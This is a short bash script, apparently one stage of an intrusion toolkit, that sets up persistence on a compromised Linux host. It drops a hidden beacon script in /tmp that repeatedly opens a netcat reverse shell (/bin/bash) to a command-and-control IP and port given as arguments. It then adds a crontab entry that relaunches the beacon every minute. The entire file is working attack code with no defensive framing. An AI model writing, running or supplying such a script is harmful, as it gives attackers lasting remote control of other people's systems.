#!/bin/bash
# Phase 2: Persistence — Install cron job + beacon script
# Usage: ./phase2_persistence.sh <C2_IP> <C2_PORT>
set -euo pipefail

C2_IP="${1:?Usage: $0 <C2_IP> <C2_PORT>}"
C2_PORT="${2:-4444}"

BEACON_SCRIPT="/tmp/.beacon.sh"

echo "[*] Phase 2: Installing persistence via cron"

# Drop beacon script to tmp
cat > "$BEACON_SCRIPT" << EOF
#!/bin/bash
while true; do
    nc -w 2 ${C2_IP} ${C2_PORT} -e /bin/bash 2>/dev/null || true
    sleep 10
done
EOF
chmod +x "$BEACON_SCRIPT"

# Install cron job that runs every minute
(crontab -l 2>/dev/null; echo "* * * * * $BEACON_SCRIPT") | crontab -

echo "[+] Beacon script installed at $BEACON_SCRIPT"
echo "[+] Cron persistence installed"
